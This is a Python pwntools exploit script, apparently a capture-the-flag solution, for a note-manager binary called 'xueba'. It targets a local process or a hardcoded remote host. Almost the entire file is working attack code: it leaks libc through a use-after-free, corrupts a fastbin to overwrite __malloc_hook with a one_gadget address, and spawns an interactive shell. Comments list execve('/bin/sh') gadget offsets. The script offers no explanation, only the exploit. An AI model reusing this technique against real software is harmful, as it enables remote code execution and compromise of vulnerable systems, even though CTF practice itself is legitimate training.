# coding:utf-8
from pwn import *
debug = 1
context.log_level='debug'
elf = ELF('./xueba')
#libc = ELF('./libc32')
if debug:
    p = process('./xueba')#,env={'LD_PRELOAD':'./libc32'})
    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
#    gdb.attach(p)
else:
    p = remote('49.4.23.164', 32232)#  49.4.23.164 32232
    libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def menu(id):
	p.recvuntil('5.Exit\n')
	p.sendline(str(id))

def add(long,name,content):
	menu(1)
	p.recvuntil('How long is your note?\n')
	p.sendline(str(long))
	p.recvuntil('Input your note name and note content:\n')
	p.send(name)
	p.send(content)

def remove(id):
	menu(3)
	p.recvuntil('Index:\n')
	p.sendline(str(id))

def show(index):
	menu(2)
	p.recvuntil('Index:\n')
	p.sendline(str(index))

def edit(index,letter):
	menu(4)
	p.recvuntil('Index:\n')
	p.sendline(str(index))
	p.recvuntil('Which letter do you want to change?\n')
	p.send(letter)


add(0x108,'a'*0x10 + '\x01','2'*0x28)#0
add(0x108,'b'*4,'2'*0x28)#1
add(0x108,'b'*4,'2'*0x28)#2

remove(0)
remove(1)
edit(0,'\x00\x01')
menu(2)
p.recvuntil('Index:\n')
p.sendline(str(0))
p.recvuntil('Content:')
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 0x68 - libc.symbols['__malloc_hook']
print 'libc_base:'+hex(libc_base)
print 'malloc_hook:'+hex(data - 0x68)
free_hook = libc_base + libc.symbols['__free_hook']
print 'free_hook:'+hex(free_hook)
system = libc_base + libc.symbols['system']
print 'system:'+hex(system)

add(0x60,'a'*0x10 + '\x01','1'*0x28)#1
add(0x60,'a'*0x8 + 'b','1'*0x28)#3

remove(1)
remove(3)
edit(1,'\x00\x01')
remove(1)

off = 0x7fa069cfab10 - 0x7fa069cfaaf5
addr = data - 0x68 - off

add(0x60,'a'*8,p64(addr - 8))#1
add(0x60,'a'*8,p64(addr - 8))#3
add(0x60,'a'*8,p64(addr - 8))#4
print 'one_gadget:' + hex(libc_base + 0x4526a)
padd = 0x7fa069cfab10 - (0x7fa069cfaaf5 + 8)
add(0x60,'a'*8,'a'*padd + p64(libc_base + 0x4526a))#4
remove(0)
#z()
menu(1)
p.recvuntil('How long is your note?\n')
p.sendline(str(0x60))
p.interactive()


# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf0274	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1117	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
